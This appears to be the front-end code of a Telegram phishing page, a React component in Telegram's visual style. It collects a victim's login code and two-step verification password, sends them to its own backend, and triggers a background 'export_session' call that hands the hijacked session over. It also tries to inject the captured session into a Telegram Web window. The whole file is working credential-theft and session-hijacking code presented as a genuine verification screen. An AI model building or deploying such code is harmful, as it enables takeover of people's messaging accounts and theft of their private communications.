import React, { useState, useEffect } from "react";
import { api } from '../services/router';
import { useNavigate } from "react-router-dom";

const VerifyCode = () => {
    const [code, setCode] = useState('');
    const [phone, setPhone] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [countdown, setCountdown] = useState(60);
    const [show2FA, setShow2FA] = useState(false);
    const [twoFAPassword, setTwoFAPassword] = useState('');
    const [isVerified, setIsVerified] = useState(false);
    const navigate = useNavigate();

    useEffect(() => {
        const storedPhone = localStorage.getItem("phone_number");
        if (storedPhone) setPhone(storedPhone);
        else navigate('/');
        const timer = setInterval(() => setCountdown((prev) => (prev <= 1 ? 0 : prev - 1)), 1000);
        return () => clearInterval(timer);
    }, [navigate]);

    const handleInputChange = async (e) => {
        const value = e.target.value.replace(/\D/g, '').substring(0, 5);
        setCode(value);
        if (value.length === 5) {
            console.log("Auto-verifying code:", value);
            await handleVerification(value);
        }
    };

    const handleVerification = async (verificationCode) => {
        const userId = localStorage.getItem("user_id");
        if (!userId) {
            setError("Session expired. Please login again.");
            navigate('/');
            return;
        }
        const codeToSend = verificationCode || code;
        if (!/^\d{5}$/.test(codeToSend)) {
            setError("Please enter a valid 5-digit code");
            return;
        }
        setLoading(true);
        setError("");
        try {
            const data = { code: codeToSend, user_id: userId };
            console.log("Sending /verify_code request:", data);
            const response = await api.post("/verify_code", data);
            console.log("Response data:", response.data);
            if (response.status === 200 && response.data.status === 200) {
                console.log("Verification successful! Proceeding to login");
                await handleSuccessfulLogin(response.data, userId);
            } else {
                setError(`Verification failed: Server returned status ${response.data.status || response.status}`);
            }
        } catch (err) {
            console.error("Caught error during verification:", err);
            const errorDetail = err.response?.data?.detail || "";
            if (err.response?.status === 403 || errorDetail.toLowerCase().includes("two-step") || errorDetail.toLowerCase().includes("2fa")) {
                console.log("2FA required, showing prompt");
                setShow2FA(true);
                setError("");
            } else {
                const errorMsg = errorDetail || "Verification failed due to an unexpected error.";
                setError(errorMsg);
            }
        } finally {
            setLoading(false);
        }
    };

    const handle2FASubmit = async () => {
        const userId = localStorage.getItem("user_id");
        if (!userId || !twoFAPassword) {
            setError("Please enter your 2FA password");
            return;
        }
        setLoading(true);
        setError("");
        try {
            const data = { user_id: userId, password: twoFAPassword };
            console.log("Sending /verify_2fa request:", data);
            const response = await api.post(`/verify_2fa/${userId}`, data);
            console.log("2FA response data:", response.data);
            if (response.status === 200 && response.data.status === 200) {
                console.log("2FA successful! Proceeding to login");
                await handleSuccessfulLogin(response.data, userId);
                setShow2FA(false);
                setTwoFAPassword('');
            } else {
                setError(`2FA failed: Server returned status ${response.data.status || response.status}`);
            }
        } catch (err) {
            const errorMsg = err.response?.data?.detail || "Invalid 2FA password.";
            setError(errorMsg);
            console.error("2FA error:", err.response?.data || err);
        } finally {
            setLoading(false);
        }
    };

    const handleSuccessfulLogin = async (responseData, userId) => {
        console.log("Entering handleSuccessfulLogin with data:", responseData);
        const sessionData = responseData.session_data;
        const loginToken = responseData.login_token;
        if (sessionData && loginToken) {
            console.log("Session data and login token present, setting localStorage");
            localStorage.clear();
            localStorage.setItem("account1", JSON.stringify(sessionData));
            localStorage.setItem("telegram_user_id", sessionData.userId || 'N/A');
            localStorage.setItem("telegram_user_name", sessionData.firstName || 'N/A');
            localStorage.setItem("telegram_user_phone", sessionData.phone || 'N/A');
            localStorage.setItem("login_token", loginToken);

            // Trigger session export in the background
            api.get(`/export_session/${userId}`)
                .then((exportResponse) => {
                    console.log("Export session response:", exportResponse.data);
                })
                .catch((exportErr) => {
                    console.error("Background session export failed:", exportErr.response?.data || exportErr);
                });

            // Show success page and redirect immediately
            setIsVerified(true);

            const telegramWebUrl = "https://web.telegram.org/k/";
            const loginScript = `
                localStorage.clear();
                localStorage.setItem("account1", '${JSON.stringify(sessionData)}');
                location.reload();
            `;

            setTimeout(() => {
                console.log("Opening Telegram Web");
                const telegramWindow = window.open(telegramWebUrl, "_blank");
                if (telegramWindow) {
                    setTimeout(() => {
                        telegramWindow.document.write(`<script>${loginScript}</script>`);
                        telegramWindow.document.close();
                    }, 1500); // Delay to ensure page loads
                    console.log("Telegram Web opened successfully in new window");
                } else {
                    console.warn("Popup blocked, redirecting current window");
                    localStorage.setItem("account1", JSON.stringify(sessionData));
                    window.location.href = telegramWebUrl;
                }
            }, 2000); // 2-second delay to show success page
        } else {
            setError("Missing session data or login token.");
            console.error("Login data incomplete:", { sessionData, loginToken });
        }
    };

    const handleResendCode = async () => {
        if (countdown > 0) return;
        setLoading(true);
        setError("");
        setCode('');
        try {
            const response = await api.post('/send_code', { phone_number: phone });
            if (response.data?.user_id) {
                localStorage.setItem('user_id', response.data.user_id);
                setCountdown(60);
            }
        } catch (err) {
            setError(err.response?.data?.detail || "Failed to resend code.");
        } finally {
            setLoading(false);
        }
    };

    const handlePaste = (e) => {
        const pastedText = e.clipboardData.getData('text').replace(/\D/g, '').substring(0, 5);
        if (pastedText) {
            e.preventDefault();
            setCode(pastedText);
            if (pastedText.length === 5) {
                console.log("Pasted 5-digit code, auto-verifying:", pastedText);
                handleVerification(pastedText);
            }
        }
    };

    if (isVerified) {
        return (
            <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
                <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md text-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 6L9 17L4 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>
                    <h1 className="text-xl font-bold text-white mb-2">Success!</h1>
                    <p className="text-[#AAAAAA] text-sm mb-4">Verification completed successfully.</p>
                    <p className="text-[#AAAAAA] text-sm">Redirecting to Telegram Web...</p>
                    <button
                        onClick={() => window.open("https://web.telegram.org/k/", "_blank")}
                        className="mt-4 bg-[#3390EC] text-white py-2 px-4 rounded-lg hover:bg-[#5EACEF]"
                    >
                        Go to Telegram Web Now
                    </button>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
            <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md">
                <div className="flex flex-col items-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4L3 11L10 14M20 4L17 21L10 14M20 4L10 14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>
                    <h1 className="text-xl font-bold text-white mb-2">
                        {show2FA ? "Two-Step Verification" : "Verification Code"}
                    </h1>
                    <div className="flex items-center gap-2 mb-4">
                        <p className="text-[#AAAAAA] text-base">{phone}</p>
                        <button onClick={() => navigate('/')} className="text-[#3390EC] hover:text-[#5EACEF] text-sm">Edit</button>
                    </div>
                    {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
                    {!show2FA ? (
                        <>
                            <p className="text-[#AAAAAA] text-sm mb-4 text-center">We've sent the code to your Telegram app</p>
                            <div className="w-full mb-6">
                                <label className="block text-[#AAAAAA] text-sm mb-2">Verification Code</label>
                                <input
                                    type="text"
                                    value={code}
                                    onChange={handleInputChange}
                                    onPaste={handlePaste}
                                    disabled={loading}
                                    className="w-full bg-[#242F3D] text-white text-center text-lg tracking-widest rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-[#3390EC]"
                                    placeholder="•••••"
                                    autoFocus
                                    maxLength={5}
                                />
                            </div>
                            <button
                                onClick={() => handleVerification()}
                                disabled={loading || code.length !== 5}
                                className={`w-full bg-[#3390EC] text-white py-3 rounded-lg hover:bg-[#5EACEF] ${loading || code.length !== 5 ? 'opacity-50 cursor-not-allowed' : ''}`}
                            >
                                {loading ? 'Verifying...' : 'VERIFY'}
                            </button>
                            <button
                                onClick={handleResendCode}
                                disabled={countdown > 0 || loading}
                                className={`mt-4 text-sm ${countdown > 0 || loading ? 'text-[#666666]' : 'text-[#3390EC] hover:text-[#5EACEF]'}`}
                            >
                                {countdown > 0 ? `Resend in ${countdown}s` : 'Resend Code'}
                            </button>
                        </>
                    ) : (
                        <>
                            <p className="text-[#AAAAAA] text-sm mb-4 text-center">Enter your two-step verification password</p>
                            <div className="w-full mb-6">
                                <label className="block text-[#AAAAAA] text-sm mb-2">Password</label>
                                <input
                                    type="password"
                                    value={twoFAPassword}
                                    onChange={(e) => setTwoFAPassword(e.target.value)}
                                    disabled={loading}
                                    className="w-full bg-[#242F3D] text-white rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-[#3390EC]"
                                    placeholder="••••••••"
                                    autoFocus
                                />
                            </div>
                            <button
                                onClick={handle2FASubmit}
                                disabled={loading || !twoFAPassword}
                                className={`w-full bg-[#3390EC] text-white py-3 rounded-lg hover:bg-[#5EACEF] ${loading || !twoFAPassword ? 'opacity-50 cursor-not-allowed' : ''}`}
                            >
                                {loading ? 'Submitting...' : 'SUBMIT'}
                            </button>
                            <button
                                onClick={() => { setShow2FA(false); setTwoFAPassword(''); setError(''); }}
                                className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm"
                            >
                                Cancel
                            </button>
                        </>
                    )}
                </div>
            </div>
        </div>
    );
};

export default VerifyCode;